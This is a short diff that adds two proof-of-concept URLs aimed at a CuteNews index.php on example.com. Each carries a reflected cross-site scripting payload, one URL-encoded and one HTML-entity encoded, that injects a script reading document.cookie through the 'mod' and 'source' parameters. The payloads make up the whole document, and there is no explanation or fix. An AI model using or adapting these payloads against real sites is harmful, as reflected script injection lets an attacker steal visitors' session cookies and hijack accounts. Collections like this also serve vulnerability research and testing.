@@ -1,0 +1,2 @@
+http://www.example.com/localhost/cutenews/index.php?mod=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--
+http://www.example.com/cutenews/index.php?mod=editnews&amp;action=list&amp;source=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--
